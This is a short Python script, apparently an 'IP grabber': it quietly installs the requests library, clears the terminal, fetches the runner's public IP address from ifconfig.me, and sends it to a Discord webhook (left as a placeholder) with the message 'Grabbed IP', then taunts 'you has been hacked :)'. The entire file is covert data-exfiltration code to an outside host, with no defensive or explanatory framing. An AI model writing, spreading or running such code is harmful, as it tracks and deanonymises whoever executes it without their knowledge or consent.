import os, subprocess
print("please wait...")
try:
	subprocess.run(["pip", "install", "requests"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
except:
	pass
if os.name == "nt":
	os.system('cls')
else:
	os.system("clear")
import requests, socket
try:
	s = socket.socket()
	s.settimeout(1)
	s.connect(("ifconfig.me", 80))
	s.sendall(f"GET /ip HTTP/1.1\r\nHost: ifconfig.me:80\r\nUser-Agent: bot\r\n\r\n".encode())
	recv = s.recv(1024).decode().replace("\r", "")
	ip = recv[recv.find("\n\n")+2:]
except:
	ip = ""
s.close()
try:
	data = {"content": f"Grabbed IP: || {ip} ||"}
	requests.post("your_discord_webhook_url", json=data, headers={'Content-Type': 'application/json', "User-Agent": "bot"})
except:
	pass
print(f"you has been hacked :)... {ip}")
